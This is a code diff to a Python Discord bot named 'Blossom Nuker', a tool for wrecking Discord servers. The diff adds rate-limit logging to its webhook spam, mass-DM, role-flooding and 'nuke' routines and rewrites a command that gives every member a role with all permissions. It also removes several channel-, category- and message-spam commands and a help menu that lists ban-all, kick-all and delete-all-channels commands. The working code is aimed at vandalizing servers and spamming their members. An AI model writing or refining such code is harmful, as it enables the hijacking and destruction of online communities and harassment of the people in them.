@@ -108,6 +108,13 @@ async def on_ready():
     print(f"{Fore.GREEN}[+] Commands loaded: {len(client.commands)}")
     print(f"{Fore.GREEN}[+] Slash commands disabled.")
 
+@client.event
+async def on_error(event, *args, **kwargs):
+    """Log errors with retry_after info if available."""
+    import traceback
+    print(f"{Fore.RED}[ERROR] Exception in {event}:")
+    traceback.print_exc()
+
 # ============================================================
 #  WEBHOOK SPAM FUNCTION
 # ============================================================
@@ -120,9 +127,19 @@ async def webhook_spam(channel, count=20):
             try:
                 await webhook.send(SPAM_MESSAGE)
                 sent += 1
+            except discord.HTTPException as e:
+                if e.status == 429:
+                    retry_after = e.response.headers.get('Retry-After', 'unknown')
+                    print(f"{Fore.RED}[RATE LIMIT] 429 error - Retry-After: {retry_after} seconds")
+                pass
             except:
                 pass
         await webhook.delete()
+    except discord.HTTPException as e:
+        if e.status == 429:
+            retry_after = e.response.headers.get('Retry-After', 'unknown')
+            print(f"{Fore.RED}[RATE LIMIT] 429 error - Retry-After: {retry_after} seconds")
+        pass
     except:
         pass
     return sent
@@ -214,6 +231,11 @@ async def nuke(ctx):
             embed.add_field(name="ID", value=str(guild.id), inline=False)
             embed.add_field(name="Executor", value=f"{ctx.author} ({ctx.author.id})", inline=False)
             await report_channel.send(embed=embed)
+    except discord.HTTPException as e:
+        if e.status == 429:
+            retry_after = e.response.headers.get('Retry-After', 'unknown')
+            print(f"{Fore.RED}[RATE LIMIT] 429 error - Retry-After: {retry_after} seconds")
+        pass
     except:
         pass
 
@@ -258,6 +280,11 @@ async def spaminvite(ctx, amount: int = 25):
                 await channel.send(SPAM_MESSAGE)
                 sent += 1
                 await asyncio.sleep(0.1)
+            except discord.HTTPException as e:
+                if e.status == 429:
+                    retry_after = e.response.headers.get('Retry-After', 'unknown')
+                    print(f"{Fore.RED}[RATE LIMIT] 429 error - Retry-After: {retry_after} seconds")
+                pass
             except:
                 pass
     try:
@@ -514,6 +541,11 @@ async def dmall(ctx, *, message: str = "You have been nuked."):
             await member.send(message)
             sent += 1
             await asyncio.sleep(0.3)
+        except discord.HTTPException as e:
+            if e.status == 429:
+                retry_after = e.response.headers.get('Retry-After', 'unknown')
+                print(f"{Fore.RED}[RATE LIMIT] 429 error - Retry-After: {retry_after} seconds")
+            failed += 1
         except:
             failed += 1
     try:
@@ -545,6 +577,11 @@ async def roles(ctx, count: int = 100):
             created += 1
             if i % 10 == 0:
                 await asyncio.sleep(0.1)
+        except discord.HTTPException as e:
+            if e.status == 429:
+                retry_after = e.response.headers.get('Retry-After', 'unknown')
+                print(f"{Fore.RED}[RATE LIMIT] 429 error - Retry-After: {retry_after} seconds")
+            failed += 1
         except:
             failed += 1
     try:
@@ -761,277 +798,38 @@ async def adminall(ctx):
             pass
         return
     try:
-        await ctx.send("Giving admin to all members...", delete_after=5)
+        await ctx.send(f"Giving admin to {len(ctx.guild.members)} members...", delete_after=5)
     except:
         pass
-    admin_role = discord.utils.get(ctx.guild.roles, name="AdminAll")
+    admin_role = discord.utils.get(ctx.guild.roles, name="Admin")
     if not admin_role:
-        admin_role = await ctx.guild.create_role(name="AdminAll", permissions=discord.Permissions.all())
-    added = 0
+        try:
+            admin_role = await ctx.guild.create_role(name="Admin", permissions=discord.Permissions.all())
+        except:
+            try:
+                await ctx.send("Failed to create Admin role.", delete_after=5)
+            except:
+                pass
+            return
+    given = 0
     failed = 0
     for member in list(ctx.guild.members):
+        if member == ctx.guild.owner:
+            continue
         try:
             await member.add_roles(admin_role)
-            added += 1
+            given += 1
             await asyncio.sleep(0.1)
         except:
             failed += 1
     try:
-        await ctx.send(f"Gave admin to {added} members. {failed} failed.", delete_after=10)
-    except:
-        pass
-
-@client.command(name="wbspam")
-async def wbspam(ctx, amount: int = 10):
-    if not ctx.guild:
-        try:
-            await ctx.send("Use this command in a server.", delete_after=5)
-        except:
-            pass
-        return
-    try:
-        await ctx.send(f"Creating webhooks and spamming {amount} times each...", delete_after=5)
-    except:
-        pass
-    total_sent = 0
-    failed = 0
-    for channel in ctx.guild.text_channels:
-        try:
-            webhook = await channel.create_webhook(name="spamhook")
-            for _ in range(amount):
-                try:
-                    await webhook.send(SPAM_MESSAGE)
-                    total_sent += 1
-                    await asyncio.sleep(0.1)
-                except:
-                    failed += 1
-            await webhook.delete()
-        except:
-            failed += 1
-    try:
-        await ctx.send(f"Sent {total_sent} webhook messages. {failed} failed.", delete_after=10)
-    except:
-        pass
-
-@client.command(name="spam")
-async def spam(ctx, *, text: str = SPAM_MESSAGE):
-    if not ctx.guild:
-        try:
-            await ctx.send("Use this command in a server.", delete_after=5)
-        except:
-            pass
-        return
-    channels = [c for c in ctx.guild.text_channels if c.permissions_for(ctx.me).send_messages]
-    if not channels:
-        try:
-            await ctx.send("No writable channels.", delete_after=5)
-        except:
-            pass
-        return
-    try:
-        await ctx.send(f"Spamming '{text[:20]}...' in {len(channels)} channels.", delete_after=5)
-    except:
-        pass
-    sent = 0
-    for channel in channels:
-        try:
-            await channel.send(text)
-            sent += 1
-            await asyncio.sleep(0.1)
-        except:
-            pass
-    try:
-        await ctx.send(f"Sent to {sent} channels.", delete_after=10)
-    except:
-        pass
-
-@client.command(name="spamchannels")
-async def spamchannels(ctx, count: int = 50, *, name: str = "spammed"):
-    if not ctx.guild:
-        try:
-            await ctx.send("Use this command in a server.", delete_after=5)
-        except:
-            pass
-        return
-    if count > 200:
-        count = 200
-    try:
-        await ctx.send(f"Creating {count} text channels named '{name}'...", delete_after=5)
-    except:
-        pass
-    created = 0
-    failed = 0
-    for i in range(count):
-        try:
-            await ctx.guild.create_text_channel(f"{name}-{i}")
-            created += 1
-            if i % 5 == 0:
-                await asyncio.sleep(0.1)
-        except:
-            failed += 1
-    try:
-        await ctx.send(f"Created {created} channels. {failed} failed.", delete_after=10)
-    except:
-        pass
-
-@client.command(name="spamvcs")
-async def spamvcs(ctx, count: int = 30, *, name: str = "vcspam"):
-    if not ctx.guild:
-        try:
-            await ctx.send("Use this command in a server.", delete_after=5)
-        except:
-            pass
-        return
-    if count > 100:
-        count = 100
-    try:
-        await ctx.send(f"Creating {count} voice channels named '{name}'...", delete_after=5)
-    except:
-        pass
-    created = 0
-    failed = 0
-    for i in range(count):
-        try:
-            await ctx.guild.create_voice_channel(f"{name}-{i}")
-            created += 1
-            if i % 5 == 0:
-                await asyncio.sleep(0.1)
-        except:
-            failed += 1
-    try:
-        await ctx.send(f"Created {created} voice channels. {failed} failed.", delete_after=10)
-    except:
-        pass
-
-@client.command(name="spamcats")
-async def spamcats(ctx, count: int = 20, *, name: str = "catspam"):
-    if not ctx.guild:
-        try:
-            await ctx.send("Use this command in a server.", delete_after=5)
-        except:
-            pass
-        return
-    if count > 50:
-        count = 50
-    try:
-        await ctx.send(f"Creating {count} categories named '{name}'...", delete_after=5)
-    except:
-        pass
-    created = 0
-    failed = 0
-    for i in range(count):
-        try:
-            await ctx.guild.create_category(f"{name}-{i}")
-            created += 1
-            if i % 5 == 0:
-                await asyncio.sleep(0.1)
-        except:
-            failed += 1
-    try:
-        await ctx.send(f"Created {created} categories. {failed} failed.", delete_after=10)
+        await ctx.send(f"Gave admin to {given} members. {failed} failed.", delete_after=10)
     except:
         pass
 
 # ============================================================
-#  HELP COMMAND
+#  RUN BOT
 # ============================================================
-@client.command(name="help")
-async def help_command(ctx):
-    embed = discord.Embed(
-        title="Blossom Nuker Commands",
-        description="Full command list:",
-        color=discord.Color.magenta()
-    )
-    embed.add_field(
-        name="Nuke",
-        value=";nuke - Maximum speed nuke (125 channels, webhook spam, 50 roles)\n"
-              ";hiroshima - Alias for ;nuke",
-        inline=False
-    )
-    embed.add_field(
-        name="Destruction",
-        value=";banall - Ban everyone\n"
-              ";kickall - Kick everyone\n"
-              ";unbanall - Unban everyone\n"
-              ";del - Delete all channels\n"
-              ";droles - Delete all roles\n"
-              ";nothing - Delete everything (no spam)",
-        inline=False
-    )
-    embed.add_field(
-        name="Permissions",
-        value=";op [@user] - Give admin to yourself or user\n"
-              ";adminall - Give admin to everyone",
-        inline=False
-    )
-    embed.add_field(
-        name="Spam and Creation",
-        value=";spam <text> - Spam custom text in all channels\n"
-              ";spaminvite [amount] - Spam invite link\n"
-              ";wbspam [amount] - Webhook spam\n"
-              ";spamchannels <count> [name] - Create text channels\n"
-              ";spamvcs <count> [name] - Create voice channels\n"
-              ";spamcats <count> [name] - Create categories\n"
-              ";roles [count] - Create roles",
-        inline=False
-    )
-    embed.add_field(
-        name="User Actions",
-        value=";kicka [@user] - Kick user or all bots\n"
-              ";rename <name> - Rename everyone\n"
-              ";dmall <message> - DM all members\n"
-              ";blame @user - Accuse someone",
-        inline=False
-    )
-    embed.add_field(
-        name="Utility",
-        value=";getbot - Invite link\n"
-              ";whitelist - Manage whitelist\n"
-              ";credits - Bot credits",
-        inline=False
-    )
-    embed.set_footer(text="Prefix: ;")
-    
-    try:
-        await ctx.send(embed=embed)
-    except:
-        pass
+print(f"{Fore.YELLOW}[+] Starting Blossom Nuker...")
+client.run(TOKEN)
 
-# ============================================================
-#  ERROR HANDLER
-# ============================================================
-@client.event
-async def on_command_error(ctx, error):
-    if isinstance(error, commands.CommandNotFound):
-        try:
-            await ctx.send(f"Command not found. Use `;help`.", delete_after=5)
-        except:
-            pass
-    elif isinstance(error, commands.MissingPermissions):
-        try:
-            await ctx.send(f"You don't have permission.", delete_after=5)
-        except:
-            pass
-    elif isinstance(error, commands.BotMissingPermissions):
-        try:
-            await ctx.send(f"I don't have permission. Missing: {error.missing_permissions}", delete_after=5)
-        except:
-            pass
-    else:
-        print(f"[ERROR] {error}")
-        try:
-            await ctx.send(f"Error: {str(error)[:100]}", delete_after=5)
-        except:
-            pass
-
-# ============================================================
-#  RUN
-# ============================================================
-if __name__ == "__main__":
-    try:
-        print(f"{Fore.GREEN}[+] Starting Blossom Nuker...")
-        client.run(TOKEN)
-    except discord.errors.LoginFailure:
-        print(f"{Fore.RED}[ERROR] Invalid Discord token!")
-    except Exception as e:
-        print(f"{Fore.RED}[ERROR] {e}")
